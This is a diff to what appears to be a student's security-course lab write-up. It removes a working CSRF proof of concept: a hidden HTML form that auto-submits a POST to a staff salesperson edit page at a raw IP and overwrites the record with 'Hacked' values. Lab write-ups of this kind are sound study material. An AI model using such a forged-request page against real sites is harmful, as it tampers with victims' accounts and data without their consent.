@@ -61,32 +61,3 @@ Vulnerability #2: CSRF
 1. If we inject the external file with the form code and the values . If we execute the html form the data is automatially inserted and   displayed in the sales persons list.
 
 <img src="https://github.com/Manchukonda/Week-8-Codepath/blob/master/CSRF.gif" width="800">
-
-Code:
-CSRF.html
-	<html>
-	<head>
-		<title>Your Feedback</title>
-		<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-	</head>
-	<body>
-		<p> Site is not secured!</p>
-		<style>
-		#attackform {
-			display: none;
-		}
-		</style>	
-		<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=2" method="POST"  id="attackform"  name="form">
-			<input type="text" name="first_name" value="Hacked fn" /><br />
-			<input type="text" name="last_name" value="Hacked ln" /><br />
-			<input type="text" name="phone" value="000-000-0000" /><br />
-			<input type="text" name="email" value="hh@h.h" /><br />
-		</form>
-		<script>
-		$(function() {
-			window.document.forms[0].submit(function(e) {
-				console.log("Done");
-			});
-		});
-		</script>
-</html>
